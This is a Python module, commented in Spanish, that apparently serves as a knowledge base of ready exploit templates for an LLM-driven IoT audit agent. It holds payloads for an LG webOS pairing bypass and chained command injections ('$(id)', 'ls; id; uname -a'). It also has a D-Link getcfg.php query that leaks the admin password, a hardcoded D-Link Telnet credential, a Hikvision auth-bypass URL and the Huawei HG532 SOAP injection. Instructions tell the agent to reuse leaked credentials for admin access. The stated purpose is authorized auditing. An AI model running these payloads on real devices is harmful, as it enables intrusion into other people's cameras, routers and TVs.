"""
Knowledge base de PoCs hardcoded para CVEs IoT relevantes.

Cada entrada documenta:
  - protocol: ws | wss | http | https | tcp | custom
  - endpoint: URL relativo o ruta del exploit
  - payload: cuerpo del request (JSON serializado / string raw)
  - method: HTTP method si aplica
  - success_indicator: substring que indica explotación exitosa en la respuesta
  - failure_indicator: substring que indica patche aplicado / no vulnerable
  - reference: URL del análisis público (Bitdefender, ZDI, etc.)

Uso desde el agente:
  - cve_search enriquece su output con `poc_template` desde este KB.
  - probes específicas (probe_lg_webos, probe_chromecast, etc.) pueden usar
    estos PoCs directamente para verificación automática.

NOTA: estos PoCs son públicos y están documentados en disclosures formales
de seguridad. Su uso está limitado a auditorías AUTORIZADAS sobre dispositivos
propios o con consentimiento explícito del propietario.
"""
from __future__ import annotations

from typing import Any, Dict, Optional


# =============================================================================
# CVE-2023-6317 — LG WebOS Prompt Bypass (Bitdefender disclosure 2024-04)
# =============================================================================
# Reference: https://www.bitdefender.com/blog/labs/lg-webos-tv-vulnerabilities-bitdefender-disclosure/
#
# El bypass real requiere enviar un manifest con `permissions[]` escalados que
# el server acepta sin validar el prompt cuando el client-key no existe.
# Versiones afectadas: webOS 4.9.7 - 7.3.1-43

LG_WEBOS_PAIRING_PERMISSIONS = [
    "TEST_SECURE",
    "CONTROL_INPUT_TEXT",
    "CONTROL_MOUSE_AND_KEYBOARD",
    "READ_INSTALLED_APPS",
    "READ_LGE_SDX",
    "READ_NOTIFICATIONS",
    "SEARCH",
    "WRITE_SETTINGS",
    "WRITE_NOTIFICATION_ALERT",
    "CONTROL_POWER",
    "READ_CURRENT_CHANNEL",
    "READ_RUNNING_APPS",
    "READ_UPDATE_INFO",
    "UPDATE_FROM_REMOTE_APP",
    "READ_LGE_TV_INPUT_EVENTS",
    "READ_TV_CURRENT_TIME",
]

LG_WEBOS_BYPASS_PAYLOAD = {
    "type": "register",
    "id": "register_0",
    "payload": {
        "forcePairing": False,
        "pairingType": "PIN",
        "client-key": "",
        "manifest": {
            "manifestVersion": 1,
            "appVersion": "1.1",
            "signed": {
                "created": "20140509",
                "appId": "com.lge.test",
                "vendorId": "com.lge",
                "localizedAppNames": {
                    "": "LG Remote App",
                    "ko-KR": "LG 리모컨",
                    "zxx-XX": "ЛГ Rэмotэ AПП",
                },
                "localizedVendorNames": {"": "LG Electronics"},
                "permissions": LG_WEBOS_PAIRING_PERMISSIONS,
                "serial": "2f930e2d2cfe083771f68e4fe7bb07",
                "vendorId": "com.lge",
            },
            "permissions": LG_WEBOS_PAIRING_PERMISSIONS,
            "signatures": [
                {
                    "signatureVersion": 1,
                    "signature": (
                        "eyJhbGdvcml0aG0iOiJSU0EtU0hBMjU2Iiwia2V5SWQiOiJ0ZXN0LXNpZ25pbmctY"
                        "2VydCIsInNpZ25hdHVyZVZlcnNpb24iOjF9.hrVRgjCwXVvE2OOSpDZ58hR+59aFNw"
                        "YDyjQgKk3auukd7pcegmE2CvbGWoyY"
                    ),
                }
            ],
        },
    },
}


# =============================================================================
# Diccionario principal — CVE → PoC template
# =============================================================================

CVE_POCS: Dict[str, Dict[str, Any]] = {
    "CVE-2023-6317": {
        "protocol": "wss",
        "endpoint": "/",
        "default_port": 3001,
        "payload": LG_WEBOS_BYPASS_PAYLOAD,
        "expect_n_messages": 3,
        "success_indicators": [
            '"type":"registered"',
            '"client-key":"',  # client-key no vacío en el response
        ],
        "failure_indicators": [
            '"error":"401',
            '"pairingType":"PROMPT"',  # respuesta normal pidiendo PIN = patcheado
        ],
        "description": (
            "LG WebOS prompt bypass via crafted manifest permissions[]. "
            "Successful exploit returns a privileged client-key without PIN."
        ),
        "reference": "Bitdefender Labs LG WebOS disclosure 2024-04",
        "severity": "HIGH",
    },

    # CVEs dependientes — requieren client-key obtenido de CVE-2023-6317
    "CVE-2023-6318": {
        "protocol": "wss",
        "endpoint": "/",
        "default_port": 3001,
        "depends_on": "CVE-2023-6317",  # marker: necesita client-key prior
        "payload_template": {
            "type": "request",
            "uri": "ssap://com.webos.service.eim/processLGTVMsg",
            "payload": {
                "msg": "ls; id; uname -a",  # command injection via msg
            },
        },
        "description": (
            "Command injection via processLGTVMsg after auth bypass. "
            "Requires client-key from CVE-2023-6317."
        ),
        "severity": "HIGH",
    },

    "CVE-2023-6319": {
        "protocol": "wss",
        "endpoint": "/",
        "default_port": 3001,
        "depends_on": "CVE-2023-6317",
        "payload_template": {
            "type": "request",
            "uri": "ssap://com.webos.service.appstatus/getInfo",
            "payload": {
                "appId": "$(id)",  # injection via appId
            },
        },
        "description": (
            "OS command injection via luna-service2 appstatus. "
            "Requires client-key from CVE-2023-6317."
        ),
        "severity": "HIGH",
    },

    "CVE-2023-6320": {
        "protocol": "wss",
        "endpoint": "/",
        "default_port": 3001,
        "depends_on": "CVE-2023-6317",
        "payload_template": {
            "type": "request",
            "uri": "ssap://com.webos.service.connectionmanager/tv/setVlanStaticAddress",
            "payload": {
                "vlanId": "100; id #",  # injection via vlanId
                "ipAddress": "1.1.1.1",
                "subnet": "255.255.255.0",
            },
        },
        "description": (
            "Authenticated command injection via connectionmanager setVlanStaticAddress. "
            "Requires client-key from CVE-2023-6317."
        ),
        "severity": "HIGH",
    },

    # =============================================================================
    # D-Link DIR-815 — /getcfg.php newline injection (3 CVEs related)
    # =============================================================================
    # CVE-2018-10106 es el bypass concreto. Las descripciones de CVE-2015-0150 y
    # CVE-2015-0152 son genéricas ("access restriction bypass", "cleartext password
    # storage"): se confirman por la misma evidencia que CVE-2018-10106. Se enlazan
    # vía `implies_cves` / `implied_by` para que el agente registre los tres a
    # partir de una sola petición — eliminando la variabilidad LLM observada en
    # runs sucesivos donde el modelo "redescubría" la verificación con vectores
    # distintos (algunos correctos, otros no).
    #
    # NOTA: estos CVEs NO se auto-confirman. El agente sigue la `verification_steps`
    # y registra cada uno; la KB sólo aporta la receta correcta.

    "CVE-2018-10106": {
        "protocol": "http",
        "endpoint": "/getcfg.php",
        "default_port": 80,
        "method": "GET",
        "query_string": "a=%0a_POST_SERVICES%3DDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3D1",
        "success_indicators": [
            "<service>DEVICE.ACCOUNT</service>",
            "<name>admin</name>",
        ],
        "failure_indicators": ["Not authorized", "<result>FAILED</result>"],
        "verification_steps": [
            "GET /getcfg.php?a=%0a_POST_SERVICES%3DDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3D1",
            "Si la respuesta contiene <service>DEVICE.ACCOUNT</service> + <name>admin</name> SIN cookie de sesión, el bypass está confirmado.",
            "La misma respuesta confirma CVE-2015-0150 (access bypass genérico) y CVE-2015-0152 (cleartext storage del campo <password>): registra los tres con record_finding usando la misma raw_output.",
        ],
        "implies_cves": ["CVE-2015-0150", "CVE-2015-0152"],
        "description": (
            "Permission bypass and information disclosure in /htdocs/web/getcfg.php "
            "via %0a (newline) injection in the 'a' parameter. The response leaks "
            "the admin account configuration, including the <password> field in "
            "plain text."
        ),
        "reference": "NVD CVE-2018-10106",
        "severity": "CRITICAL",
    },

    "CVE-2015-0150": {
        "protocol": "http",
        "endpoint": "/getcfg.php",
        "default_port": 80,
        "method": "GET",
        "verification_steps": [
            "Este CVE describe un bypass GENÉRICO de las restricciones de acceso del DIR-815.",
            "NO uses 'la página /  pide login' como verificación negativa — un router puede mostrar formulario de login Y al mismo tiempo tener un bypass por endpoint.",
            "Si CVE-2018-10106 está confirmado (cualquier endpoint devuelve datos administrativos sin auth), este CVE también lo está. Usa la misma raw_output como evidencia.",
        ],
        "implied_by": "CVE-2018-10106",
        "description": (
            "Generic access restriction bypass in the DIR-815 administrative UI "
            "before firmware 2.07.B01. Confirmed if any specific bypass (e.g. "
            "CVE-2018-10106) returns admin data without authentication."
        ),
        "reference": "NVD CVE-2015-0150",
        "severity": "CRITICAL",
    },

    "CVE-2015-0152": {
        "protocol": "http",
        "endpoint": "/getcfg.php",
        "default_port": 80,
        "method": "GET",
        "query_string": "a=%0a_POST_SERVICES%3DDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3D1",
        "success_indicators": ["<password>"],
        "verification_steps": [
            "Usa el bypass de CVE-2018-10106 — DEVICE.ACCOUNT es el _POST_SERVICES que funciona; no inventes otros (DEVICE.CONFIG, DEVICE.SYSTEM, etc. devuelven postxml vacío).",
            "Si la respuesta contiene <password>…</password> (incluso vacío), es prueba directa de almacenamiento en texto plano: el firmware NO hashea ni cifra la contraseña en config.",
            "Registra con la misma raw_output que CVE-2018-10106 — son dos defectos en el mismo endpoint.",
        ],
        "implied_by": "CVE-2018-10106",
        "description": (
            "Cleartext storage of administrative password in DIR-815 firmware "
            "before 2.07.B01. Confirmed if any endpoint (notably the CVE-2018-10106 "
            "bypass) returns the <password> field in plain text."
        ),
        "reference": "NVD CVE-2015-0152",
        "severity": "CRITICAL",
    },

    # =============================================================================
    # CVE-2019-18852 — D-Link hardcoded Alphanetworks account (Telnet)
    # =============================================================================
    "CVE-2019-18852": {
        "protocol": "tcp",
        "default_port": 23,
        "verification_steps": [
            "Comprobar si TCP/23 (Telnet) está abierto. Si está CERRADO, el CVE NO aplica al dispositivo en su configuración actual — registra como confirmed=false con razón explícita.",
            "Si está abierto, usar probe_telnet con try_default_creds=True. Credencial hardcoded documentada: usuario 'Alphanetworks', contraseña derivada del modelo (wrgg19_c_dlwbr_dir815 para DIR-815).",
        ],
        "failure_indicators": ["Connection refused", "filtered"],
        "description": (
            "Hardcoded 'Alphanetworks' user account with TELNET access in several "
            "D-Link DIR-* series. Requires TCP/23 reachable. Affects DIR-815 A1 "
            "v1.01 per advisory; later revisions may have Telnet disabled."
        ),
        "reference": "NVD CVE-2019-18852",
        "severity": "CRITICAL",
    },

    # =============================================================================
    # CVE-2017-7921 — Hikvision IP camera magic-cookie auth bypass
    # =============================================================================
    "CVE-2017-7921": {
        "protocol": "http",
        "endpoint": "/Security/users?auth=YWRtaW46MTEK",
        "default_port": 80,
        "method": "GET",
        "success_indicators": ["<userList>", "<userName>admin</userName>"],
        "failure_indicators": ["401", "403", "<errorCode>"],
        "description": (
            "Hikvision Web SDK pre-auth cookie bypass. GET request with auth="
            "base64('admin:11') as URL parameter dumps user list."
        ),
        "reference": "ICS-CERT advisory ICSA-17-124-01",
        "severity": "CRITICAL",
    },

    # =============================================================================
    # CVE-2014-9222 — Misfortune Cookie (Allegro RomPager <4.34)
    # =============================================================================
    "CVE-2014-9222": {
        "protocol": "http",
        "endpoint": "/HNAP1/",
        "default_port": 7547,
        "method": "GET",
        "success_indicators": ["RomPager", "Allegro"],
        "description": (
            "Allegro RomPager memory corruption via Cookie header. Banner detection "
            "is sufficient to flag — actual exploit requires shellcode crafting."
        ),
        "reference": "Check Point Misfortune Cookie 2014-12",
        "severity": "CRITICAL",
    },

    # =============================================================================
    # CVE-2017-17215 — Huawei HG532 SOAP injection (Mirai vector)
    # =============================================================================
    "CVE-2017-17215": {
        "protocol": "http",
        "endpoint": "/ctrlt/DeviceUpgrade_1",
        "default_port": 37215,
        "method": "POST",
        "headers": {
            "Content-Type": "text/xml",
            "SOAPAction": "urn:schemas-upnp-org:service:WANPPPConnection:1#GetStatusInfo",
        },
        "payload_template": (
            '<?xml version="1.0" ?>'
            '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            '<s:Body>'
            '<u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">'
            '<NewStatusURL>$(id)</NewStatusURL>'
            '<NewDownloadURL>FOO</NewDownloadURL>'
            '</u:Upgrade>'
            '</s:Body></s:Envelope>'
        ),
        "success_indicators": ["uid=", "gid="],
        "description": (
            "Huawei HG532 SOAP injection in DeviceUpgrade. Original Mirai vector. "
            "Banner detection via probe_cwmp; full exploit requires SOAP POST."
        ),
        "reference": "ZDI-17-1011",
        "severity": "CRITICAL",
    },

    # =============================================================================
    # CVE-2021-33558 — Boa 0.94.x information disclosure (ficheros de config sin auth)
    # -----------------------------------------------------------------------------
    # El agente tendía a verificar este CVE curleando rutas inventadas (p.ej.
    # /cgi-bin/webproc) y descartarlo como "no aplica". La descripción del CVE lista
    # los ficheros EXACTOS — esta receta los fija para que el disclosure se confirme
    # de forma determinista y, si filtra credenciales, se siga la cadena hacia /admin/.
    # =============================================================================
    "CVE-2021-33558": {
        "protocol": "http",
        "endpoint": "/backup.html",
        "default_port": 80,
        "method": "GET",
        "success_indicators": ["admin_pass", "admin_user", "wifi_psk", "DEVICE_CONFIG", "pass"],
        "failure_indicators": ["404 Not Found"],
        "verification_steps": [
            "Curl LOS FICHEROS EXACTOS de la descripción, NO inventes rutas (NO /cgi-bin/webproc): "
            "GET /backup.html , GET /config.js , GET /js/log.js , GET /preview.html , "
            "GET /log.html , GET /email.html , GET /online-users.html — uno por uno.",
            "Si CUALQUIERA devuelve 200 con contenido sensible (credenciales, PSK, config, "
            "tokens), el CVE está CONFIRMADO: record_finding(confirmed=true) con esa respuesta "
            "LITERAL como raw_output.",
            "CADENA: si el contenido filtra credenciales (admin_pass/admin/...) y una ruta de "
            "panel (admin_url / admin_panel, p.ej. /admin/), reúsalas con HTTP Basic en ESE "
            "puerto: curl -sk -u <user>:<pass> http://<ip>:<port>/admin/ . Un 200 con datos "
            "privilegiados = acceso autenticado confirmado (hallazgo CRITICAL aparte).",
            "Solo si TODOS los ficheros dan 404 márcalo confirmed=false (NOT_VULNERABLE).",
        ],
        "description": (
            "Boa 0.94.x site-specific information disclosure: config/backup files "
            "(backup.html, preview.html, js/log.js, log.html, email.html, "
            "online-users.html, config.js) served without authentication, leaking "
            "credentials and device configuration."
        ),
        "reference": "NVD CVE-2021-33558",
        "severity": "HIGH",
    },
}


def get_poc(cve_id: str) -> Optional[Dict[str, Any]]:
    """Devuelve el PoC template para un CVE id, o None si no está en KB."""
    return CVE_POCS.get(cve_id)

